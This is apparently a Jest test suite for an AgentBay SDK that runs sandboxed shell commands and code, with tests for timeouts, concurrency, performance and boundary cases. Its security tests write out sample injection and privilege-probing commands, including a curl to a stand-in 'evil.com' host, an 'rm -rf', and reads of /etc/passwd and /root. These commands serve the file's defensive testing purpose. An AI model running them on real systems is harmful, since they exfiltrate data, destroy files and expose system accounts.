import { describe, beforeEach, afterEach, test, expect } from '@jest/globals';
import { AgentBay } from '../../src/agent-bay';
import { Session } from '../../src/session';
import { Command } from '../../src/command';
import { Code } from '../../src/code';
import { log } from 'console';

// 会话创建辅助函数
async function createSession(imageId?: string): Promise<{ agentBay: AgentBay; session: Session }> {
  const agentBay = new AgentBay({ apiKey: process.env.AGENTBAY_API_KEY || 'test-api-key' });
  const sessionResult = await agentBay.create(imageId ? { imageId } : {});
  expect(sessionResult.success).toBe(true);

  return {
    agentBay,
    session: sessionResult.session!
  };
}

describe('Command Comprehensive Tests', () => {
  let agentBay: AgentBay;
  let session: Session;
  let command: Command;
  let code: Code;

  beforeEach(async () => {
    // 为了支持runCode测试，统一使用code_latest镜像
    const sessionInfo = await createSession('code_latest');
    agentBay = sessionInfo.agentBay;
    session = sessionInfo.session;
    command = session.command;
    code = session.code;
  });

  afterEach(async () => {
    if (session) {
      await agentBay.delete(session);
    }
  });

  // 1. ExecuteCommand 功能测试用例
  describe('1. ExecuteCommand Function Tests', () => {
    test('TC-CMD-001: 基础Shell命令执行', async () => {
      // 前提条件: AgentBay实例已创建且连接正常，Session已成功建立，Command对象已初始化
      // 测试目标: 验证基础shell命令的正确执行

      const startTime = Date.now();
      const result = await command.executeCommand("echo 'Hello World'", 1000);
      const executionTime = Date.now() - startTime;

      // 验证点
      expect(result.success).toBe(true);
      expect(result.output).toContain('Hello World');
      expect(result.requestId).toBeDefined();
      expect(result.requestId).not.toBe('');
      expect(executionTime).toBeGreaterThan(0); // 执行时间应该大于0

      log(`TC-CMD-001 execution time: ${executionTime}ms`);
    });

    test('TC-CMD-002: 文件操作命令执行', async () => {
      // 前提条件: Session环境已准备，有文件系统访问权限
      // 测试目标: 验证文件创建、读取、删除命令的执行

      const testContent = 'test content';
      const testFile = '/tmp/test_file.txt';

      // 步骤1: 执行创建文件命令
      const createResult = await command.executeCommand(`echo '${testContent}' > ${testFile}`);
      expect(createResult.success).toBe(true);

      // 步骤2: 执行读取文件命令
      const readResult = await command.executeCommand(`cat ${testFile}`);
      expect(readResult.success).toBe(true);
      expect(readResult.output.trim()).toBe(testContent);

      // 步骤3: 执行删除文件命令
      const deleteResult = await command.executeCommand(`rm ${testFile}`);
      expect(deleteResult.success).toBe(true);

      // 步骤4: 验证文件删除
      const verifyResult = await command.executeCommand(`ls ${testFile}`);
      expect(verifyResult.success).toBe(false); // 文件不存在应该返回错误
    });

    test('TC-CMD-003: 超时机制验证', async () => {
      // 前提条件: Session环境已准备，系统支持sleep命令
      // 测试目标: 验证命令执行超时控制机制

      const timeoutMs = 1000;
      const startTime = Date.now();

      const result = await command.executeCommand('sleep 5', timeoutMs);
      const actualTime = Date.now() - startTime;

      // 验证点
      expect(result.success).toBe(false);
      expect(actualTime).toBeLessThan(6000); // 应该在5秒内被中断
      expect(actualTime).toBeGreaterThan(timeoutMs * 0.8); // 接近超时时间

      log(`TC-CMD-003 actual execution time: ${actualTime}ms, timeout: ${timeoutMs}ms`);
    });

    test('TC-CMD-004: 错误命令处理', async () => {
      // 前提条件: Session环境已准备
      // 测试目标: 验证无效命令的错误处理机制

      const result = await command.executeCommand('invalid_command_xyz');

      // 验证点
      expect(result.success).toBe(false);
      expect(result.errorMessage).toBeDefined();
      expect(result.errorMessage).not.toBe('');

      log(`TC-CMD-004 error message: ${result.errorMessage}`);
    });
  });

  // 2. RunCode 功能测试用例 (复用主session，已是code_latest镜像)
  describe('2. RunCode Function Tests', () => {
    test('TC-CODE-001: Python代码执行', async () => {
      // 前提条件: Session环境已准备，Python运行环境可用
      // 测试目标: 验证Python代码的正确执行

      const pythonCode = "print('Hello from Python')";
      const result = await code.runCode(pythonCode, 'python', 60);

      // 验证点
      expect(result.success).toBe(true);
      expect(result.result).toContain('Hello from Python');
      expect(result.requestId).toBeDefined();

      log(`TC-CODE-001 result: ${result.result}`);
    });

    test('TC-CODE-002: JavaScript代码执行', async () => {
      // 前提条件: Session环境已准备，JavaScript运行环境可用
      // 测试目标: 验证JavaScript代码的正确执行

      const jsCode = "console.log('Hello from JavaScript')";
      const result = await code.runCode(jsCode, 'javascript', 60);

      // 验证点
      expect(result.success).toBe(true);
      expect(result.result).toContain('Hello from JavaScript');
      expect(result.requestId).toBeDefined();

      log(`TC-CODE-002 result: ${result.result}`);
    });

    test('TC-CODE-003: 复杂Python代码执行', async () => {
      // 前提条件: Session环境已准备，Python标准库可用
      // 测试目标: 验证包含数据处理的Python代码执行

      const complexPythonCode = `
import json
data = [1, 2, 3, 4, 5]
result = sum(data)
print(json.dumps({"sum": result, "count": len(data)}))
      `.trim();

      const result = await code.runCode(complexPythonCode, 'python', 300);

      // 验证点
      expect(result.success).toBe(true);

      // 解析JSON输出
      const jsonMatch = result.result.match(/\{.*\}/);
      expect(jsonMatch).toBeTruthy();

      if (jsonMatch) {
        const parsedResult = JSON.parse(jsonMatch[0]);
        expect(parsedResult.sum).toBe(15);
        expect(parsedResult.count).toBe(5);
      }

      log(`TC-CODE-003 result: ${result.result}`);
    });

    test('TC-CODE-004: 代码执行超时控制', async () => {
      // 前提条件: Session环境已准备
      // 测试目标: 验证代码执行的超时控制机制

      const longRunningCode = "import time; time.sleep(10)";
      const timeoutSeconds = 5;
      const startTime = Date.now();

      const result = await code.runCode(longRunningCode, 'python', timeoutSeconds);
      const actualTime = Date.now() - startTime;

      // 验证点
      expect(result.success).toBe(false);
      expect(actualTime).toBeLessThan(15000); // 应该在15秒内完成（包含一些网络延迟）
      expect(actualTime).toBeGreaterThan(timeoutSeconds * 1000 * 0.5); // 接近超时时间

      log(`TC-CODE-004 actual time: ${actualTime}ms, timeout: ${timeoutSeconds}s`);
    });

    test('TC-CODE-005: 不支持语言处理', async () => {
      // 前提条件: Session环境已准备
      // 测试目标: 验证不支持语言的错误处理

      const result = await code.runCode('System.out.println("Hello");', 'java', 60);

      // 验证点
      expect(result.success).toBe(false);
      expect(result.errorMessage).toBeDefined();
      expect(result.errorMessage!.toLowerCase()).toContain('language');

      log(`TC-CODE-005 error: ${result.errorMessage}`);
    });

    test('TC-CODE-006: 代码语法错误处理', async () => {
      // 前提条件: Session环境已准备
      // 测试目标: 验证语法错误代码的处理

      const syntaxErrorCode = "print('unclosed string";
      const result = await code.runCode(syntaxErrorCode, 'python', 60);

      // 验证点
      expect(result.success).toBe(false);
      expect(result.errorMessage).toBeDefined();
      expect(result.errorMessage!.toLowerCase()).toMatch(/(syntax|error)/);

      log(`TC-CODE-006 syntax error: ${result.errorMessage}`);
    });
  });

  // 3. 并发执行测试用例
  describe('3. Concurrent Execution Tests', () => {
    test('TC-CONCURRENT-001: 并发命令执行', async () => {
      // 前提条件: 多个Session已建立，系统支持并发操作
      // 测试目标: 验证多个命令的并发执行能力

      // 创建多个会话（使用默认镜像，命令执行不需要code_latest）
      const sessions: Session[] = [];
      const agentBays: AgentBay[] = [];

      try {
        for (let i = 0; i < 3; i++) {
          const sessionInfo = await createSession(); // 不指定imageId，使用默认
          agentBays.push(sessionInfo.agentBay);
          sessions.push(sessionInfo.session);
        }

        // 并发执行不同命令
        const commands = [
          "echo 'Command 1'",
          "echo 'Command 2'",
          "echo 'Command 3'"
        ];

        const startTime = Date.now();
        const promises = sessions.map((sess, index) =>
          sess.command.executeCommand(commands[index])
        );

        const results = await Promise.all(promises);
        const concurrentTime = Date.now() - startTime;

        // 验证点
        results.forEach((result, index) => {
          expect(result.success).toBe(true);
          expect(result.output).toContain(`Command ${index + 1}`);
        });

        log(`TC-CONCURRENT-001 concurrent execution time: ${concurrentTime}ms`);

      } finally {
        // 清理会话
        for (let i = 0; i < sessions.length; i++) {
          await agentBays[i].delete(sessions[i]);
        }
      }
    });

    test('TC-CONCURRENT-002: 混合代码并发执行', async () => {
      // 前提条件: Session已建立，Python和JavaScript环境都可用
      // 测试目标: 验证不同语言代码的并发执行

      // 复用主session（已是code_latest镜像）
      const pythonCode = "print('Python result')";
      const jsCode = "console.log('JavaScript result')";

      const startTime = Date.now();
      const [pythonResult, jsResult] = await Promise.all([
        code.runCode(pythonCode, 'python', 60),
        code.runCode(jsCode, 'javascript', 60)
      ]);
      const concurrentTime = Date.now() - startTime;

      // 验证点
      expect(pythonResult.success).toBe(true);
      expect(jsResult.success).toBe(true);
      expect(pythonResult.result).toContain('Python result');
      expect(jsResult.result).toContain('JavaScript result');

      log(`TC-CONCURRENT-002 mixed execution time: ${concurrentTime}ms`);
    });
  });

  // 4. 性能测试用例
  describe('4. Performance Tests', () => {
    test('TC-PERF-001: 命令执行性能基线', async () => {
      // 前提条件: 稳定的测试环境，无其他高负载任务
      // 测试目标: 建立命令执行性能基线

      const iterations = 10; // 减少迭代次数以适应测试环境
      const executionTimes: number[] = [];
      let successCount = 0;

      for (let i = 0; i < iterations; i++) {
        const startTime = Date.now();
        const result = await command.executeCommand(`echo 'Test ${i}'`);
        const executionTime = Date.now() - startTime;

        executionTimes.push(executionTime);
        if (result.success) {
          successCount++;
        }
      }

      // 计算统计数据
      const avgTime = executionTimes.reduce((a, b) => a + b, 0) / executionTimes.length;
      const maxTime = Math.max(...executionTimes);
      const minTime = Math.min(...executionTimes);
      const sortedTimes = [...executionTimes].sort((a, b) => a - b);
      const p99Time = sortedTimes[Math.floor(0.99 * sortedTimes.length)];

      // 验证点
      expect(avgTime).toBeLessThan(5000); // 调整为5秒以适应网络延迟
      expect(p99Time).toBeLessThan(10000); // 99%请求在10秒内完成
      expect(successCount / iterations).toBeGreaterThanOrEqual(0.8); // 80%成功率

      log(`TC-PERF-001 Performance: Avg=${avgTime}ms, Min=${minTime}ms, Max=${maxTime}ms, P99=${p99Time}ms, Success=${successCount}/${iterations}`);
    });

    test('TC-PERF-002: 代码执行性能测试', async () => {
      // 前提条件: 稳定的测试环境
      // 测试目标: 测试代码执行的性能表现

      // 复用主session（已是code_latest镜像）
      const pythonIterations = 5;
      const jsIterations = 5;
      const pythonTimes: number[] = [];
      const jsTimes: number[] = [];

      // Python性能测试
      for (let i = 0; i < pythonIterations; i++) {
        const startTime = Date.now();
        await code.runCode(`print('Python test ${i}')`, 'python', 60);
        pythonTimes.push(Date.now() - startTime);
      }

      // JavaScript性能测试
      for (let i = 0; i < jsIterations; i++) {
        const startTime = Date.now();
        await code.runCode(`console.log('JS test ${i}')`, 'javascript', 60);
        jsTimes.push(Date.now() - startTime);
      }

      const avgPythonTime = pythonTimes.reduce((a, b) => a + b, 0) / pythonTimes.length;
      const avgJsTime = jsTimes.reduce((a, b) => a + b, 0) / jsTimes.length;

      // 验证点
      expect(avgPythonTime).toBeLessThan(10000); // Python平均执行时间 < 10秒
      expect(avgJsTime).toBeLessThan(10000); // JavaScript平均执行时间 < 10秒

      log(`TC-PERF-002 Code Performance: Python Avg=${avgPythonTime}ms, JS Avg=${avgJsTime}ms`);
    });
  });

  // 5. 安全性测试用例
  describe('5. Security Tests', () => {
    test('TC-SEC-001: 命令注入防护', async () => {
      // 前提条件: Session环境已准备，系统具有安全防护机制
      // 测试目标: 验证系统防止命令注入攻击

      const maliciousCommands = [
        "echo test; rm -rf /tmp/test_malicious",
        "echo test | curl http://evil.com || true",
        "echo test & sleep 1"
      ];

      for (const maliciousCommand of maliciousCommands) {
        const result = await command.executeCommand(maliciousCommand);

        // 验证点: 命令应该被安全执行或被阻止
        // 系统应该保持稳定，不执行危险操作
        expect(result.requestId).toBeDefined(); // 请求应该被处理

        log(`TC-SEC-001 Malicious command result: ${maliciousCommand} -> Success: ${result.success}`);
      }
    });
    test('TC-SEC-003: 权限控制验证', async () => {
      // 前提条件: Session环境已准备，系统具有权限控制机制
      // 测试目标: 验证命令和代码执行的权限控制

      const restrictedCommands = [
        "id && echo 'user_info_accessed'", // 用户信息访问测试，替代sudo
        "cat /etc/passwd | head -3 2>/dev/null || echo 'access_controlled'", // 系统文件访问
        "ls /root 2>/dev/null || echo 'root_access_denied'", // root目录访问测试
        "chmod 777 /tmp/test_file 2>/dev/null || echo 'permission_denied'" // 权限修改
      ];

      for (const restrictedCommand of restrictedCommands) {
        const result = await command.executeCommand(restrictedCommand);

        // 验证点: 权限控制应该生效
        expect(result.requestId).toBeDefined();

        log(`TC-SEC-003 Permission test: ${restrictedCommand} -> Success: ${result.success}`);
      }
    });
  });

  // 6. 边界测试用例
  describe('6. Boundary Tests', () => {
    test('TC-BOUNDARY-001: 极长命令处理', async () => {
      // 前提条件: Session环境已准备
      // 测试目标: 验证极长命令的处理能力

      // 构造长命令(1KB)
      const longString = 'x'.repeat(1000);
      const longCommand = `echo '${longString}'`;

      const result = await command.executeCommand(longCommand);

      // 验证点
      expect(result.requestId).toBeDefined();
      // 系统应该能处理长命令或给出合理错误
      if (result.success) {
        expect(result.output).toContain(longString);
      } else {
        expect(result.errorMessage).toBeDefined();
      }

      log(`TC-BOUNDARY-001 Long command (${longCommand.length} chars): Success=${result.success}`);
    });

    test('TC-BOUNDARY-002: 大量输出处理', async () => {
      // 前提条件: Session环境已准备
      // 测试目标: 验证大量输出的处理能力

      // 生成大量输出的命令
      const result = await command.executeCommand('seq 1 100'); // 输出1-100

      // 验证点
      expect(result.requestId).toBeDefined();
      if (result.success) {
        expect(result.output.split('\n').length).toBeGreaterThan(50);
      }

      log(`TC-BOUNDARY-002 Large output: Success=${result.success}, Output length=${result.output.length}`);
    });

    test('TC-BOUNDARY-003: 特殊字符处理', async () => {
      // 前提条件: Session环境已准备
      // 测试目标: 验证特殊字符和编码的处理

      const specialChars = [
        "echo 'Special: !@#$%^&*()'",
        "echo 'Unicode: 你好世界 🌍'",
        "echo Quotes: 'double' and 'single'",
        "echo 'Newlines:\nand\ttabs'"
      ];

      for (const specialCommand of specialChars) {
        const result = await command.executeCommand(specialCommand);

        // 验证点
        expect(result.requestId).toBeDefined();

        log(`TC-BOUNDARY-003 Special chars: ${specialCommand} -> Success=${result.success}`);
      }
    });
  });

  // 数据完整性和一致性测试
  describe('7. Data Integrity Tests', () => {
    test('should maintain command execution consistency', async () => {
      // 验证命令执行的一致性
      const testCommand = "echo 'consistency test'";
      const iterations = 5;
      const results: string[] = [];

      for (let i = 0; i < iterations; i++) {
        const result = await command.executeCommand(testCommand);
        expect(result.success).toBe(true);
        results.push(result.output.trim());
      }

      // 验证所有结果应该一致
      const firstResult = results[0];
      results.forEach(result => {
        expect(result).toBe(firstResult);
      });

      log(`Data integrity test: All ${iterations} executions returned consistent results`);
    });

    test('should handle session state correctly', async () => {
      // 验证会话状态的正确处理
      expect(session.sessionId).toBeDefined();
      expect(session.sessionId).not.toBe('');
      expect(command).toBeDefined();
      expect(code).toBeDefined();

      // 验证命令对象与会话的关联
      const result = await command.executeCommand("echo 'session test'");
      expect(result.success).toBe(true);
      expect(result.requestId).toBeDefined();

      log(`Session state test: SessionId=${session.sessionId}, Command available=${!!command}`);
    });
  });
});
